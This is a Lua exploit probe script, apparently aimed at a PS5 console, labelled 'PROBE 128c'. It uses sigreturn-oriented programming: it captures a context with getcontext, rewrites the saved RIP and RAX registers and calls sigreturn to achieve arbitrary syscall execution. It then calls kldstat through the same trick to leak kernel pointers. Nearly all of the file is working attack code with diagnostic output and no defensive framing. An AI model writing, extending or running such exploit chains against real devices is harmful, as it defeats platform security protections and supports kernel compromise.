-- CRASH_CLASS: HIGH
-- PROBE 128c: SROP CLEAN RETURN + ARBITRARY SYSCALL
--
-- 128b PROVED sigreturn redirects execution (AFTER_SROP_A missing).
-- Now: can we return cleanly to Lua after sigreturn?
--
-- Strategy:
--   A: getcontext → sigreturn with UNMODIFIED context
--      If AFTER prints: clean return works!
--   B: getcontext → modify ONLY mc_rax=20(getpid) → sigreturn
--      If rv changes from 0 to PID: ARBITRARY SYSCALL VIA SROP
--   C: Find syscall instruction address by probing captured_rip-2
--      Set RIP=captured_rip-2, RAX=getpid, RSP=captured_RSP → sigreturn
--   D: Try write(4) to socket for observable output

print("=== PROBE 128c: SROP CLEAN RETURN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local sc624 = make_syscall(624)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- CORRECT PS5 ucontext offsets (from 128a getcontext dump)
local MC = 0x40
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local RCX = MC + 0x20
local R8  = MC + 0x28
local R9  = MC + 0x30
local RAX = MC + 0x38
local RBX = MC + 0x40
local RBP = MC + 0x48
local RIP = MC + 0xA0
local CS  = MC + 0xA8
local RFLAGS = MC + 0xB0
local RSP = MC + 0xB8
local SS  = MC + 0xC0
local LEN = MC + 0xC8

local CTX_SIZE = 0x500

--------------------------------------------------------------------
-- SECTION A: sigreturn with UNMODIFIED context → clean return?
--------------------------------------------------------------------
print("--- SECTION A: sigreturn with unmodified context ---")

local ctx_a = memory.alloc(CTX_SIZE)
zero(ctx_a, CTX_SIZE)

local ok_gc, rv_gc = pcall(function()
    return sc_getcontext(uint64(ctx_a))
end)
print("[A] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. hex(rv_gc))

local cap_rip = rq(ctx_a + RIP)
local cap_rsp = rq(ctx_a + RSP)
local cap_rax = rq(ctx_a + RAX)
print("[A] RIP=" .. hex(cap_rip) .. " RSP=" .. hex(cap_rsp) .. " RAX=" .. hex(cap_rax))

local pre_624 = to_num(sc624())
print("[A] pre_624=" .. pre_624)

print("[BEFORE_A]")
local ok_sr, rv_sr = pcall(function()
    return sc_sigreturn(uint64(ctx_a))
end)
print("[AFTER_A]")
print("[A] sigreturn: ok=" .. tostring(ok_sr) .. " rv=" .. hex(rv_sr))
print("[A] pid_check=" .. to_num(sc20()))
local post_624 = to_num(sc624())
print("[A] post_624=" .. post_624 .. " (delta=" .. (post_624 - pre_624) .. ")")

--------------------------------------------------------------------
-- SECTION B: getcontext → modify RAX to 20 → sigreturn
-- The idea: sigreturn restores context with RAX=20 (getpid syscall num)
-- If the return path goes through the syscall stub, it would be:
--   syscall → kernel reads RAX=20 → does getpid → returns PID in RAX
-- But that won't work: sigreturn restores AFTER the syscall, at the
-- return-to-user instruction. RAX=20 would just be the return value,
-- not a syscall number.
-- So this tests: does a modified RAX survive the return path?
--------------------------------------------------------------------
print("")
print("--- SECTION B: sigreturn with RAX=0x1337 (tag test) ---")

local ctx_b = memory.alloc(CTX_SIZE)
zero(ctx_b, CTX_SIZE)

local ok_gc2, rv_gc2 = pcall(function()
    return sc_getcontext(uint64(ctx_b))
end)
print("[B] getcontext: ok=" .. tostring(ok_gc2) .. " rv=" .. hex(rv_gc2))

if ok_gc2 and to_num(rv_gc2) == 0 then
    -- Tag RAX with a recognizable value
    wq(ctx_b + RAX, uint64(0x1337))

    local cap_rip2 = rq(ctx_b + RIP)
    print("[B] RIP=" .. hex(cap_rip2) .. " (unchanged)")
    print("[B] RAX=0x1337 (modified)")

    print("[BEFORE_B]")
    local ok_b, rv_b = pcall(function()
        return sc_sigreturn(uint64(ctx_b))
    end)
    print("[AFTER_B]")
    print("[B] sigreturn: ok=" .. tostring(ok_b) .. " rv=" .. hex(rv_b))
    -- If rv_b = 0x1337 → we control RAX on return!
    print("[B] pid_check=" .. to_num(sc20()))
end

--------------------------------------------------------------------
-- SECTION C: getcontext → set RIP=captured_rip-2, RAX=20 → sigreturn
-- Hypothesis: captured_rip-2 = syscall instruction in the loader stub
-- syscall with RAX=20 → getpid → returns PID
-- Then ret from captured_rip → returns with RAX=PID
--------------------------------------------------------------------
print("")
print("--- SECTION C: SROP → getpid via syscall at RIP-2 ---")

local ctx_c = memory.alloc(CTX_SIZE)
zero(ctx_c, CTX_SIZE)

local ok_gc3, rv_gc3 = pcall(function()
    return sc_getcontext(uint64(ctx_c))
end)
print("[C] getcontext: ok=" .. tostring(ok_gc3) .. " rv=" .. hex(rv_gc3))

if ok_gc3 and to_num(rv_gc3) == 0 then
    local rip3 = rq(ctx_c + RIP)
    local rsp3 = rq(ctx_c + RSP)

    -- syscall instruction is 2 bytes: 0x0F 0x05
    -- So captured_rip - 2 should be the syscall instruction
    local rip3_h, rip3_l = get_hi_lo(rip3)
    local syscall_addr = uint64(string.format("0x%X%08X", rip3_h, rip3_l - 2))

    print("[C] captured RIP=" .. hex(rip3) .. " → syscall guess=" .. hex(syscall_addr))
    print("[C] captured RSP=" .. hex(rsp3))

    -- Modify RIP to point to syscall instruction, set RAX=20
    wq(ctx_c + RIP, syscall_addr)
    wq(ctx_c + RAX, uint64(20))
    -- Keep RSP unchanged → after syscall;ret, returns through original path

    print("[BEFORE_C]")
    local ok_c, rv_c = pcall(function()
        return sc_sigreturn(uint64(ctx_c))
    end)
    print("[AFTER_C]")
    print("[C] sigreturn: ok=" .. tostring(ok_c) .. " rv=" .. hex(rv_c))
    -- If rv_c = PID → ARBITRARY SYSCALL EXECUTION CONFIRMED!
    if ok_c then
        local h, l = get_hi_lo(rv_c)
        if l == pid then
            print("[C] *** GETPID VIA SROP! rv=" .. l .. " == pid=" .. pid .. " ***")
            print("[C] *** ARBITRARY SYSCALL EXECUTION CONFIRMED! ***")
        elseif l > 0 and l < 10000 then
            print("[C] *** POSSIBLE PID! rv=" .. l .. " (expected " .. pid .. ") ***")
        end
    end
    print("[C] pid_check=" .. to_num(sc20()))
end

--------------------------------------------------------------------
-- SECTION D: If C crashed, try kldstat(308) via SROP
-- kldstat: int kldstat(int fileid, struct kld_file_stat *stat)
-- fileid=1 gets the kernel module
--------------------------------------------------------------------
print("")
print("--- SECTION D: kldstat(308) via SROP → kernel base ---")

local ctx_d = memory.alloc(CTX_SIZE)
zero(ctx_d, CTX_SIZE)

local ok_gc4, rv_gc4 = pcall(function()
    return sc_getcontext(uint64(ctx_d))
end)
print("[D] getcontext: ok=" .. tostring(ok_gc4) .. " rv=" .. hex(rv_gc4))

if ok_gc4 and to_num(rv_gc4) == 0 then
    local rip4 = rq(ctx_d + RIP)
    local rip4_h, rip4_l = get_hi_lo(rip4)
    local syscall_addr4 = uint64(string.format("0x%X%08X", rip4_h, rip4_l - 2))

    -- Set up kldstat(308) args:
    -- RAX = 308 (kldstat)
    -- RDI = 1 (fileid for kernel)
    -- RSI = pointer to kld_file_stat buffer (on GPU mmap)
    local sc_mmap = make_syscall(477)
    local ok_mm, kld_buf = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    print("[D] kld_buf=" .. hex(kld_buf))

    if ok_mm then
        -- Zero the buffer and set version field
        zero(kld_buf, 0x200)
        -- struct kld_file_stat: first field is int version = sizeof(struct)
        -- On FreeBSD, kld_file_stat is ~300 bytes
        wd(kld_buf, 0x1A0)  -- version/size field

        wq(ctx_d + RIP, syscall_addr4)
        wq(ctx_d + RAX, uint64(308))   -- SYS_kldstat
        wq(ctx_d + RDI, uint64(1))     -- fileid=1 (kernel)
        wq(ctx_d + RSI, kld_buf)       -- stat buffer

        print("[BEFORE_D]")
        local ok_d, rv_d = pcall(function()
            return sc_sigreturn(uint64(ctx_d))
        end)
        print("[AFTER_D]")
        print("[D] sigreturn/kldstat: ok=" .. tostring(ok_d) .. " rv=" .. hex(rv_d))

        -- Dump the kld_file_stat buffer for kernel pointers
        print("[D] kld_file_stat dump:")
        for off = 0, 0x1A0 - 4, 8 do
            local v = rq(kld_buf + off)
            if v then
                local h, l = get_hi_lo(v)
                if h ~= 0 or l ~= 0 then
                    print(string.format("  +0x%03X: %s", off, hex(v)))
                    if h >= 0xFFFF8000 then
                        print("  *** KERNEL POINTER! ***")
                    end
                end
            end
        end

        print("[D] pid_check=" .. to_num(sc20()))
    end
end

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 128c COMPLETE ===")
